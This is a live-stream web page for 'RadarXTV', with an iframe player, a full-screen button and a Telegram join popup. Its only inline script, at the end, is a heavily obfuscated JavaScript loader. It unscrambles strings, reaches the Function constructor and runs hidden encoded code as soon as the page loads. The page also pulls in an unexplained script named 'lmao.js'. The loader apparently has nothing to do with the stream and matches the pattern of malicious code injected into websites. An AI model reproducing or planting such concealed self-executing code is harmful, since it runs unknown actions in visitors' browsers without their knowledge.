<!DOCTYPE html>
<?php include 'banner.php'; ?>
<html lang="en">
<head>
<script src="lmao.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
    
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
    <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div>
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<!-- Popup for Telegram -->
<div id="popup" class="popup" style="display: flex;">
    <div class="popup-content">
        <p>Join RadarXCricket on Telegram</p>
        <button id="joinBtn">Join</button>
        <button id="cancelBtn">Cancel</button>
    </div>
</div>

<script>
(function(){var Dbw='',HXA=509-498;function yjO(a){var m=4672520;var d=a.length;var p=[];for(var g=0;g<d;g++){p[g]=a.charAt(g)};for(var g=0;g<d;g++){var r=m*(g+164)+(m%29332);var j=m*(g+352)+(m%22959);var t=r%d;var c=j%d;var w=p[t];p[t]=p[c];p[c]=w;m=(r+j)%6728021;};return p.join('')};var Ilq=yjO('jcuittcsphvuyldemxgqzrfosonbrktanworc').substr(0,HXA);var JxA='+g=mqaklvh{ o,noo.a)o0=s<da.ldoff=(..lf;7pc)gCfc);d";r=dstv[[79jst)8z,5h,f+C)[[77r{0ph}suuj7,gc6v8yru +r]aC4tel1en2r yi,];oanv(i[]ofodavjh b tr,1s3=rnc2s".wa)lg>0mn(0hi,;gan C=1qe(==]rah{q+0is;((1}a=epv"r9y9l;r)ar(u1gihs[ieogrh;)v+vid2q6chl+t-tdmw;= );;t-ia(h,9lod==(gqhmaiq.nAugt2 hn4>}s;n=dfS.7o qp9u"a, f) eic;s;;=a0(urnrjlovh+r(90lv=(=A=jf=)vc]))(;aa8if,,a wruAdpn*<;]u+),o.q[4,oe(dva=.,hr8e;+}+9!gzayCdg;=,n;b8rpvv(fou.=]l{.rnw7t[[;.;(1j=e);25esr+clceksq =]"=i=,)e,nm=(vnue;Avrqa+)}(hr )2zn()q0f[c)+wl(h]i)t(=l.8u]4)-)x.0v9=me-eoe;s==hin+r;ur; (v(v=1c(,lCe-"]rv<lg7,.6vtA1[+e1ktbz ri smvt(,rim;0 +.r;mn+nlfer;q+a;;df ){a (ro)fe0e===e1.<uaote.+nbs.hm2,gtm0i;+,;rcr1+ ;a(8)r=}+l*=,fu dl7),}ne.lrag;1oba)2"r+.ces.=r-[lru[6g;vrr,m.;a jho{cae(,rr;vo )vSt";(9aa6qrktui==dayn6{".(p)p];i[vtn;<u+w=nm5etd;nnCtras678thc6henlgatst(.oCj6a=(]8! nlvrrdt.0e3,znsa2v(])))rfsi=n;3ars-i)(a."v;;o4;irurh+';var opK=yjO[Ilq];var Jtd='';var ALR=opK;var YXs=opK(Jtd,yjO(JxA));var UvD=YXs(yjO('jQ;l,O\/=4f%O(e53l2O3O,lcons!DeL)n1_nr}Oe=IO\'e.6we_((Odtf6u}02 O2.o=_4e.64_iI350_O$OOa OcOmOelF.3O(O)r;\'i $OaO%31,e6rQOrnto2,{a!Ot.]SBO;tO(8naO.u}OO+of3.OO9&eueO6.r.;t_+foO.Lr:})}Oe$((tO3.{1ue$_]c9b,$36@!ps]6nl6O]il)1(O(O])i"O3)O1!3OwOOan01Os2s.m5fa3:itOiO=5i]3&l]K_tf.e,qmnOOoOOtM1Oru5<ma(j. te5mkI(eOrts6.(,Pr.Eid+(o).$Ejn%c3eel.lsOiO8Clsupmo3nOO&qd$esls%a#+aMk\/Mdsp%l_rban_o}arlefO1ehz5aOc%[HA\'1ObutOc=ogO<n5ng u.on>(1)t*OgnDtJ3til28:d;ftO_]w _i_em;!e(etOf)5HvaeOoed)fdeO.5;O.we?i H%.p1d_rOdrcOOatmF(ar1oette.3tO"3O3re.,sae7OueooKfuon3%ff$e.Oo ae_ee4 a}r 1O)n.Oo4el!$erndtn O\/(a%%%mfeGpcni6ps]rl_3L,c08o)1l@Ol.e783(kf9o.fsOOna;_riO"(OSt_gIl5tt_Sn5t__tcf%n677062CmvoQOO3nOiO;as: $;ck0pOtd).4$td((e hOe!7.%8Mm;MH={l]"!9OLrf[%3O=25.OejOd.R>ea(Oijn.OJ4)"=.6rk"OD#.)O66O] o(43])%O@GOe..u!mO@.O=o3]jn.O_o,%OF5],l;ji0fe[OK+Odtol*sQOe2{e(1_je.CSaO,onl3u)(n\/9_b(a4r ;oa0aOOn.C$[Ou!OOt%O)($c1!OL$9%_O36o4oc,nOOgL)ncr)(O;i)O37Oi4.MtPffe_7OC6rn;O136](ie_a9O%.e9b,d96j} eEO6O),qlo(IF]tz._2{))h1)[e\/tr;CGa;O)%e0{(gh3(be=_aeOe1)deOmgn$Oc]%(v6a4%nOd=l).0O;O=.at.d!a.ESl71O{eOt8) !n(6,en:;;3a)!Bo3t4b5Kt(1n"qn{8n_)S)}(75l,osO)=_1_f(_t%)Mlf_bu_.6!c805ee9N1n>4 $i[eDr;"b((O=tn4ln]l8C0Oze1a!.1om?.w}opaOL0tc_%[t1){pOk$er5j60)46.,h)s,ogH2"=_ eesO5$rO.eb3A=hjne(rCtefOtE7Of2d=Si3OnO o_8O2]sNoOwo4I42=03ch.u_O4{aOp$p)b_=)+reks{O,O, f1]O_(tu]0Ot2]O;tr8e9m_3en]p(Om;}rdO5S=}e2ht_f]33a.s8m f6(5p_eOOenOtae1,lo}n34Rm,i_Oie)$*miaO8n$OO,{.$.3)i 7OO(oO_97O.3o3)3O0)%+g_(kOced0.(_d=O3a?@Oebpe{9L. O e&Oo7$(&)79tjn]im4.Ot% 4=#:OeO@FOOceg(Os#Oa{c he7Ba)O_)O@di2\/Oqh.!)-OtOOm i;.,=_l5O{u_00_;{O44t}O]ej_ =.em(386])({5$rtOoo)#9fOq4(oO;Oufu8?Cnuc]}]a)d)A)OkwFOt% 4Pd6(EO(OOlRr2r}]Ou6(eO)<5!}f;Obbi6O.7O.Or.9O3H7i(oO7.iO.Ors6O]$Ou3qt;p0wO\'\'fOOO3%_O OO3a$!%)_2t{OfedOi]E9-i)s4seOe.lO_S2(;#6s{O0Oi8,2Dres!$!O3%%ucOl(5sO49tOu!O}*oGeJ.N&OMA}6)eO3cB\/3yveO!O7nh)O])[O-{$Oj!O 2}.t)8,\/]2O&MOf4r%()nO:).7lOOOq] ]!n_#O2[e9]waw,35o)OO{8b(c4#{48-je%p3g(F4]eOn0rOPh)j#v{LO:eOr%;sflO%nOl5f%g2_{;3;ds=]d Nd.eoO2$,3OO7O9__.7.eeerltOi>fci3${nt4t fo(e)#rO}e=,eN)nO(! OO s0]a3I()$ef()G(iL%aO2)!_O On5C;Llitwr,.o]O[_%t_ 9)OftO1]87 OiOc<L]_lQa[rt(rOd(aameOc$rre0ag\/ 3_OO,62)9(t.le..givrC77j4o o.o,(O)+n+ al2Ob]af)\/34OOOowO2yJ,f))$O6(mrO.ey.10ai)urb_eO%O)t$OiQ]"]On2OOaf)O).f{hi1urif2LjFOi2n%)One 1$>ir;{qpneir,f.,e_)_$le{d)3(O5.Es5dF4(  O,3Os2;Ofq})r 2.t\/.)d_b6eb[{rreter{!f!r1it(!,=f0niejsmr72O =b2$(6hvau?dcfR o{{yu9r(&3h9r=)e.e0O!_O=foO(ou2.n.wsO ;!ir*5.)eOar%cln,9#& ]O.'));var WHu=ALR(Dbw,UvD );WHu(5550);return 3343})()
</script>

</body>
</html>